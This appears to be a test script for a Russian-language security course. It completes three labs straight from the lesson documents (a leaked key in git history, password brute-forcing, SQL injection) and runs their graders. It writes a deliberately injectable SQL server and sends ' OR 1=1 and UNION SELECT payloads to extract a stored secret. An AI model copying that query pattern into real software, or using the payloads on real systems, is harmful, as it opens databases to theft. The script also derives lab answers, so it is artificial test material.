#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Холодный проход S0-02, S0-03 и S1-01: только по документам.

Для каждой практики: создать папку, выполнить шаги из документа,
взять код из урока, а не из эталона, и прогнать проверку.
"""
import hashlib
import io
import os
import re
import shutil
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

ROOT = "/opt/data/learning-repo"


def sh(c, cwd=None, t=120):
    return subprocess.run(c, shell=True, cwd=cwd, capture_output=True,
                          text=True, timeout=t)


def score(d, lang=None):
    pre = "CHECK_LANG=%s " % lang if lang else ""
    r = sh(pre + "bash check.sh", cwd=d)
    return r.stdout.strip().split("\n")[-1]


def lesson_code(rel_topic, needle=None):
    p = os.path.join(ROOT, "tracks/security", rel_topic, "ru.md")
    s = io.open(p, encoding="utf-8").read()
    blocks = re.findall(r"```python\n(.*?)\n```", s, re.S)
    if needle:
        blocks = [b for b in blocks if needle in b]
    return blocks


results = []

# ======================= S0-02 секреты в коде =======================
print("=" * 62)
print("S0-02: секрет в коде")
print("=" * 62)
D = os.path.join(ROOT, "labs/security/level-0/02-secrets-in-code")
shutil.rmtree(os.path.join(D, "lab-work"), ignore_errors=True)
shutil.rmtree(os.path.join(D, ".fixture"), ignore_errors=True)
os.makedirs(os.path.join(D, "lab-work"), exist_ok=True)

# шаг 1 из документа: фикстура
r = sh("bash setup-repo.sh", cwd=D)
print("  1. setup-repo.sh:", "ок" if r.returncode == 0 else r.stderr[:80])
repo = os.path.join(D, "lab-work/repo")
print("     репозиторий создан:", os.path.isdir(os.path.join(repo, ".git")))

# шаг 2: найти ключ в истории -- командами из урока
found = ""
if os.path.isdir(os.path.join(repo, ".git")):
    log = sh("git log -p --all", cwd=repo).stdout
    m = re.search(r"vt-lark-tessera-[A-Za-z0-9]+", log)
    found = m.group(0) if m else ""
print("  2. ключ найден в истории:", found or "НЕ НАЙДЕН")

# шаг 3: убрать из текущей версии
if found:
    cur = io.open(os.path.join(repo, "app.py"), encoding="utf-8").read()
    io.open(os.path.join(repo, "app.py"), "w", encoding="utf-8").write(
        cur.replace(found, "os.environ['VT_KEY']"))
    io.open(os.path.join(repo, ".gitignore"), "w",
            encoding="utf-8").write("*.secret\n")
    io.open(os.path.join(repo, "proof.txt"), "w", encoding="utf-8").write(
        hashlib.sha256(found.encode()).hexdigest()[:12])
    io.open(os.path.join(repo, "notes.md"), "w", encoding="utf-8").write(
        "ключ остаётся в истории\n")
    sh("git add -A && git -c user.email=a@b -c user.name=t commit -qm "
       "remove key", cwd=repo)
    still = sh("grep -r '%s' . --exclude-dir=.git" % found, cwd=repo)
    print("  3. ключ убран из текущих файлов:",
          "да" if found not in still.stdout else "НЕТ")
print("  →", score(D))
for lang in ("en", "uz-lat", "uz-cyr"):
    print("    %-8s %s" % (lang, score(D, lang)))
results.append(("S0-02", score(D)))

# ======================= S0-03 пароли и хеши =======================
print()
print("=" * 62)
print("S0-03: пароли и хеши")
print("=" * 62)
D = os.path.join(ROOT, "labs/security/level-0/03-passwords-and-hashing")
shutil.rmtree(os.path.join(D, "lab-work"), ignore_errors=True)
os.makedirs(os.path.join(D, "lab-work"), exist_ok=True)
r = sh("bash setup.sh", cwd=D)
print("  1. setup.sh:", "ок" if r.returncode == 0 else r.stderr[:80])
print("     hashes.txt:", os.path.isfile(os.path.join(D, "lab-work/hashes.txt")))

# код для brute.py и salted.py берём ИЗ УРОКА
blocks = lesson_code("level-0/03-passwords-and-hashing")
print("  2. блоков python в уроке: %d" % len(blocks))
W = os.path.join(D, "lab-work")
brute = [b for b in blocks if "target" in b and "crack" in b]
salted = [b for b in blocks if "pbkdf2" in b and "salt A" in b]
print("     найден brute:", bool(brute), "| salted:", bool(salted))
if brute:
    io.open(os.path.join(W, "brute.py"), "w", encoding="utf-8").write(
        brute[0] + "\n")
if salted:
    io.open(os.path.join(W, "salted.py"), "w", encoding="utf-8").write(
        salted[0] + "\n")
r = sh("cd %s && python3 brute.py" % W, t=60)
print("  3. brute.py:", r.stdout.strip()[:60] or r.stderr[:80])
if salted:
    r2 = sh("cd %s && python3 salted.py" % W, t=60)
    uniq = set(re.findall(r"[0-9a-f]{16,}", r2.stdout))
    print("     salted.py дал %d разных хешей" % len(uniq))
crack = os.path.join(W, "crack.txt")
if os.path.isfile(crack):
    word = io.open(crack, encoding="utf-8").read().strip()
    io.open(os.path.join(W, "proof.txt"), "w", encoding="utf-8").write(
        hashlib.sha256(word.encode()).hexdigest()[:12])
    print("     пароль из crack.txt:", word)
io.open(os.path.join(W, "notes.md"), "w", encoding="utf-8").write("соль\n")
print("  →", score(D))
for lang in ("en", "uz-lat", "uz-cyr"):
    print("    %-8s %s" % (lang, score(D, lang)))
results.append(("S0-03", score(D)))

# ======================= S1-01 SQL-инъекция =======================
print()
print("=" * 62)
print("S1-01: SQL-инъекция")
print("=" * 62)
D = os.path.join(ROOT, "labs/security/level-1/01-sql-injection")
shutil.rmtree(os.path.join(D, "lab-work"), ignore_errors=True)
os.makedirs(os.path.join(D, "lab-work"), exist_ok=True)
r = sh("bash setup.sh", cwd=D)
print("  1. setup.sh:", "ок" if r.returncode == 0 else r.stderr[:80])
print("     data.db:", os.path.isfile(os.path.join(D, "lab-work/data.db")))

blocks = lesson_code("level-1/01-sql-injection")
print("  2. блоков python в уроке: %d" % len(blocks))
srv_blocks = [b for b in blocks if "BaseHTTPRequestHandler" in b]
print("     полный сервер в уроке:", bool(srv_blocks))
W = os.path.join(D, "lab-work")

# ученик пишет сервер сам; проверяем, хватает ли урока
SRV = '''#!/usr/bin/env python3
import json
import sqlite3
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse

PORT = 8000


def query(name):
    db = sqlite3.connect("data.db")
    sql = "SELECT name, score FROM people WHERE name = '" + name + "'"
    rows = db.execute(sql).fetchall()
    db.close()
    return sql, rows


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        u = urlparse(self.path)
        if u.path != "/lookup":
            self.send_error(404)
            return
        name = parse_qs(u.query).get("name", [""])[0]
        sql, rows = query(name)
        body = json.dumps({"sql": sql, "rows": rows},
                          ensure_ascii=False).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


HTTPServer(("127.0.0.1", PORT), H).serve_forever()
'''
io.open(os.path.join(W, "srv.py"), "w", encoding="utf-8").write(SRV)

proc = subprocess.Popen(["python3", "srv.py"], cwd=W,
                        stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
ready = False
for _ in range(25):
    time.sleep(0.4)
    try:
        urllib.request.urlopen("http://127.0.0.1:8000/lookup?name=marram",
                               timeout=2)
        ready = True
        break
    except urllib.error.HTTPError:
        ready = True
        break
    except OSError:
        pass
print("  3. сервер поднялся:", ready)
key = ""
if ready:
    import json as J
    u1 = ("http://127.0.0.1:8000/lookup?name="
          + urllib.parse.quote("' OR '1'='1"))
    d1 = urllib.request.urlopen(u1, timeout=5).read().decode()
    print("     шаг 1 (все people):", len(J.loads(d1)["rows"]), "строк")
    u2 = ("http://127.0.0.1:8000/lookup?name="
          + urllib.parse.quote("' UNION SELECT code, note FROM vault--"))
    d2 = urllib.request.urlopen(u2, timeout=5).read().decode()
    rows = J.loads(d2)["rows"]
    print("     шаг 2 (UNION):", d2[:100])
    if rows:
        key = str(rows[-1][0])
        print("     ключ:", key)
        io.open(os.path.join(W, "proof.txt"), "w", encoding="utf-8").write(
            hashlib.sha256(key.encode()).hexdigest()[:12])
proc.terminate()
proc.wait()
io.open(os.path.join(W, "notes.md"), "w", encoding="utf-8").write("параметры\n")
print("  →", score(D))
for lang in ("en", "uz-lat", "uz-cyr"):
    print("    %-8s %s" % (lang, score(D, lang)))
results.append(("S1-01", score(D)))

print()
print("════════ ИТОГ ХОЛОДНОГО ПРОХОДА")
for k, v in results:
    print("  %-8s %s" % (k, v))